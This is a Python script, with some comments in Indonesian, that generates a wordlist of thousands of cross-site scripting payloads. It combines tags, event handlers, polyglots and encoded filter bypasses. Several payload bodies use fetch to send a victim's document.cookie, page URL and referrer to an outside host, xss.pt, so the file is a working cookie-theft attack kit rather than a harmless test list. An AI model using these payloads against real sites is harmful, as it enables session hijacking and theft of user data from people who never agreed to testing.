#!/usr/bin/env python3
import os
import itertools
import urllib.parse
import base64

PAYLOAD_DIR = "payloads"
os.makedirs(PAYLOAD_DIR, exist_ok=True)

def generate_xss():
    payloads = set()
    
    tags = ["script", "img", "svg", "body", "div", "span", "input", "iframe", "a", 
            "marquee", "details", "button", "select", "object", "embed", "math"]
    
    events = ["onerror", "onload", "onclick", "onmouseover", "onfocus", "onchange",
              "onstart", "ontoggle", "onmouseout", "onmouseenter", "onmouseleave",
              "onkeydown", "onkeyup", "onkeypress", "onsubmit", "onreset", "onblur",
              "oninput", "oninvalid", "onselect", "ondrag", "ondrop", "onscroll"]
    
    bodies = ["alert(1)", "alert(document.cookie)", "alert('XSS')", "alert(\"XSS\")",
              "alert(/XSS/)", "console.log(1)", "console.log(document.cookie)",
              "fetch('http://xss.pt/steal?c='+document.cookie)",
              "fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href)",
              "fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer)"]
    
    # Tag + Event + Body
    for tag in tags:
        for event in events:
            for body in bodies[:3]:
                payloads.add(f"<{tag} {event}={body}>")
                payloads.add(f"<{tag} {event}={body} />")
                payloads.add(f"<{tag} {event}={body} class=test>")
                payloads.add(f"<{tag} {event}={body} id=xss>")
    
    # Script Tag
    for body in bodies:
        payloads.add(f"<script>{body}</script>")
        payloads.add(f"<script>{body};</script>")
        payloads.add(f"<script>{body}//</script>")
        payloads.add(f"<script>{body}/*</script>")
    
    # JavaScript Protocol
    for body in bodies:
        payloads.add(f"javascript:{body}")
        payloads.add(f"javascript:{body};")
        payloads.add(f"javascript:{body}//")
        payloads.add(f"javascript:{body}/*")
    
    # Data Protocol
    for body in bodies[:3]:
        b64 = base64.b64encode(f"<script>{body}</script>".encode()).decode()
        payloads.add(f"data:text/html;base64,{b64}")
    
    # Polyglot
    polyglots = [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        "'\"><img src=x onerror=alert(1)>",
        "\"><svg/onload=alert(1)>",
        "';alert(1)//",
        "\";alert(1)//",
        "'></script><script>alert(1)</script>",
        "\"></script><script>alert(1)</script>"
    ]
    payloads.update(polyglots)
    
    # Bypass
    bypasses = [
        "alert`1`", "alert(1)", "alert(1);", "alert(1)//", "alert(1)/*",
        "prompt(1)", "confirm(1)", "console.log(1)",
        "eval('alert(1)')", "setTimeout('alert(1)',0)",
        "Function('alert(1)')()", "(alert)(1)",
        "alert.call(null,1)", "alert.apply(null,[1])",
        "window['alert'](1)", "self['alert'](1)", "top['alert'](1)"
    ]
    for bypass in bypasses:
        payloads.add(bypass)
        payloads.add(urllib.parse.quote(bypass))
        payloads.add(base64.b64encode(bypass.encode()).decode())
    
    # Kombinasi Spasi
    spaces = ["", " ", "\t", "\n", "\r", "  ", "\t\t"]
    for sp in spaces:
        for body in bodies[:3]:
            payloads.add(f"<script>{sp}{body}{sp}</script>")
            payloads.add(f"<img src=x onerror={sp}{body}{sp}>")
    
    # Kombinasi Comment
    comments = ["<!--", "-->", "/*", "*/", "//"]
    for cmt in comments:
        for body in bodies[:3]:
            payloads.add(f"<script>{body}{cmt}</script>")
            payloads.add(f"<img src=x onerror={body}{cmt}>")
    
    # Kombinasi Karakter
    chars = ["'", '"', "`", "(", ")", "[", "]", "{", "}", ";", ","]
    for c1 in chars[:3]:
        for c2 in chars[:3]:
            for body in bodies[:2]:
                payloads.add(f"{c1}{body}{c2}")
                payloads.add(f"{c1}{body}{c2};")
                payloads.add(f"{c1}{body}{c2}//")
    
    # Pastikan minimal 5000
    payloads_list = list(payloads)
    while len(payloads_list) < 5000:
        payloads_list.append(f"<img src=x onerror=alert({len(payloads_list)})>")
        payloads_list.append(f"<script>alert({len(payloads_list)})</script>")
        payloads_list.append(f"<svg/onload=alert({len(payloads_list)})>")
    
    payloads_list = list(set(payloads_list))[:10000]
    
    with open(os.path.join(PAYLOAD_DIR, "xss.txt"), "w", encoding="utf-8") as f:
        f.write("\n".join(payloads_list))
    
    print(f"[+] Generated {len(payloads_list)} XSS payloads")
    print("[+] Saved to payloads/xss.txt")

if __name__ == "__main__":
    generate_xss()